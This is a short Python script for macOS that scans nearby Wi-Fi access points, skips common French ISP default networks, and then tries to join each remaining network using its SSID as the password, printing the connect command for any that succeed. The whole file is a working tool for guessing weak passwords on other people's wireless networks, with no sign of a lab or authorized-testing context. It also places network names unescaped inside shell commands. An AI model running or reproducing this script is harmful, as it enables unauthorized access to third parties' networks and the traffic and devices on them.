#! /usr/bin/python

import sys, os
import time
import os.path
import re

interface_wifi="en3"


def print_red(text) :
	print ('\033[22;31m' + text + '\033[0;m')
def print_green(text) :
	print ('\033[22;32m' + text + '\033[0;m')
def print_in(text) :
	print ('\033[0;34m' + text + '\033[1;m')

filter=re.compile('^(.+)([0-9a-f][0-9a-f]\:[0-9a-f][0-9a-f]\:[0-9a-f][0-9a-f]\:[0-9a-f][0-9a-f]\:[0-9a-f][0-9a-f]\:[0-9a-f][0-9a-f])',re.IGNORECASE)


file=open("SSID_FOUND.txt",'w')

print_in("\nScan of available AP WIFI ...\n")
os.popen('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport interface_wifi --channel=48')
ALL_SSID=os.popen('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport interface_wifi -s | egrep -v "NONE|FreeWifi|Freebox-|Livebox-|NEUF|Bbox|SFR"').read()
file.write(ALL_SSID)
file.close()

file=open("SSID_FOUND.txt",'r')
lines_ALL_SSID=file.readlines()
file.close()


print("Following WIFI AP are available (stored into SSID_FOUND.txt):")
for i in range(len(lines_ALL_SSID)):
	#print lines_ALL_SSID[i]
	res=filter.findall(lines_ALL_SSID[i])
	#pour chaque AP WIFI
	for SSID in res:
		print_green(SSID[0].strip() + " / " + SSID[1])

raw_input("\nPlease to edit SSID_FOUND.txt if you want to delete SSID to check (Press any key to continue)\n")

file=open("SSID_FOUND.txt",'r')
lines_ALL_SSID=file.readlines()
file.close()

print_in("\nCheck PASSWORD equal to SSID ...\n")
for i in range(len(lines_ALL_SSID)):
	res=filter.findall(lines_ALL_SSID[i])
	#pour chaque AP WIFI
	for SSID in res:
		MAC=SSID[1]
		SSID=SSID[0].strip()
		#SSID="Password_To_test"
		print("SSID=" + SSID + " (" + MAC + ") / PASSWORD=" + SSID + "")
		os.popen('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport interface_wifi -z')
		attempt_connection=os.popen('/usr/sbin/networksetup -setairportnetwork ' + interface_wifi + ' "' + SSID + '" "' + SSID + '"').read()
		if "network" in attempt_connection : print_red("This password is wrong :(\n")
		else : 
			print_green("This password is true :)")
			print('To connect you: /usr/sbin/networksetup -setairportnetwork ' + interface_wifi + ' "' + SSID + '" "' + SSID + '"\n')

os.popen('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport interface_wifi -z').read()

